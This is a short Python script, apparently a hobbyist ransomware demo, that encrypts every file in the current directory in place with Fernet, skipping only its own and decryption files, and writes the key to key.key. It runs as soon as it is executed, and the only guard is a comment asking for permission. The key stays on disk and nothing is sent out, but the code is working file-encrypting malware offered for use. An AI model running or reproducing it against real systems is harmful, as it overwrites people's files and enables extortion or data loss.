#Author: Ben-Edwards44
#Only use on people who have given you explicit permission


import os
from cryptography.fernet import Fernet


NO_ENCRYPT = ["main.py", "key.key", "decrypt.py"]


def save_key(filename, key):
  with open(filename, "wb") as file:
    file.write(key)


def encrypt_files(files, key):
  for i in files:
    with open(i, "rb") as file:
      contents = file.read()

    encrypted = Fernet(key).encrypt(contents)

    with open(i, "wb") as file:
      file.write(encrypted)


def main():
  files = [i for i in os.listdir() if os.path.isfile(i) and i not in NO_ENCRYPT]
  key = Fernet.generate_key()
  
  save_key("key.key", key)
  encrypt_files(files, key)

  
main()
